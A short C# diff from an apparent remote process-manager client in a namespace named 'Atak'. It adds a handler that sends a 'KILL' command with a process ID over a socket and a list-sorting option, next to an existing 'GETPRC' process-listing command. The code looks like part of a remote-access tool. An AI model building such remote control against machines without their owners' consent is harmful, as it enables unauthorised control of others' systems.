@@ -28,7 +28,10 @@ namespace Atak
 
         private void killToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //TODO : MAKE KILL REQ AND RESPONSE
+            if (listView1.SelectedItems[0].Text != null)
+            {
+                socket.Send(Encoding.UTF8.GetBytes("KILL|" + listView1.SelectedItems[0].SubItems[1].Text));
+            }
         }
 
         private void startNewProcessToolStripMenuItem_Click(object sender, EventArgs e)
@@ -46,6 +49,11 @@ namespace Atak
         {
             listView1.Items.Clear();
             socket.Send(Encoding.UTF8.GetBytes("GETPRC"));
+        }
+
+        private void sortAZToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            listView1.Sorting = SortOrder.Ascending;
         }
     }
 }
